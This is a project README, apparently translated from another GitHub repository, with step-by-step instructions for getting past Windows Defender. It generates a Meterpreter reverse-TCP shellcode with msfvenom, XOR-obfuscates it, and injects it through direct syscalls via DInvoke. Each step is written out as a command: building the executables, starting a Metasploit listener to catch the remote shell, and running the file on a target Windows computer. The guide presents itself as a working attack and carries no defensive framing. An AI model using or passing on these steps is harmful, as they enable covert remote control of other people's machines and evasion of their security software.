# Bypass-AV-DirectSyscalls
Scripts to bypass Windows Defender antivirus protection using the Direct Syscalls technique with an injection of shellcode previously obfuscated with an XOR function.

<p align="center">
    This project is translated from :
    <br />
    <a href="https://github.com/Processus-Thief/Bypass-AV-DirectSyscalls"><strong>https://github.com/Processus-Thief/Bypass-AV-DirectSyscalls</strong></a>
  </p>
</div>

<br /><br />

### Usage

1. Generate a Metasploit meterpreter in the form of a shellcode with msfvenom inside your Kali Linux :
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<SERVER> LPORT=<PORT> -f csharp
```
2. Install Visual Studio Code on your PC : https://code.visualstudio.com/download

3. Install C# and PowerShell 7 extensions in VS Code. Open the terminal inside VS Code.

4. Create a new DotNet project in Visual Studio Code :
```  
dotnet new console
```
5. Replace the contents of Program.cs with the contents of XorCipher.cs and replace the shellcode with that generated with msfvenom.
6. Generate the solution in the form of a PE file with its embedded libraries :
```
dotnet publish -p:PublishSingleFile=true -r win-x64 -c Release --self-contained true -p:PublishTrimmed=true
```
7. Run the compiled file in a command prompt :
```
.\XorCipher.exe
```
8. Create a second DotNet project in another instance of Visual Studio Code :
```
dotnet new console
```
9. Install the dependency DInvoke :
```
dotnet add package DInvoke --version 1.0.4
```
10. Replace the contents of Program.cs with the contents of DirectSyscalls.cs and replace the shellcode with that generated with XorCipher.exe
11. Generate the solution in the form of a PE file with its embedded libraries :
```
dotnet publish -p:PublishSingleFile=true -r win-x64 -c Release --self-contained true -p:PublishTrimmed=true
```
9. Launch a listener in the metasploit console inside your Kali Linux :
```
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost <SERVER>
set lport <PORT>
exploit
```
10. Launch the compiled exe on the target computer (it must be Windows). Enjoy :)
